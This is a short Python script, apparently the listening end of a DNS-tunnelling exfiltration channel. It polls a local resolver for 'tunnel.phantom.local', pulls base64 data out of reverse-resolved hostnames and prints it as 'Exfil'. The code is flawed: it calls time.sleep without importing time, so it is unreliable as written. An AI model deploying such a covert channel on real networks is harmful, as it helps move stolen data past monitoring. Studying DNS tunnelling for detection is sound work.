import dns.resolver
import socket
import base64

resolver = dns.resolver.Resolver()
resolver.nameservers = ['127.0.0.1']

while True:
    try:
        answers = resolver.resolve('tunnel.phantom.local', 'A')
        for rdata in answers:
            ip = rdata.address
            subdomain = socket.gethostbyaddr(ip)[0].split('.')[0]
            if '-' in subdomain:
                payload = subdomain.split('-')[0]
                print(f"[DNS] Exfil: {base64.b64decode(payload)}")
    except:
        pass
    time.sleep(1)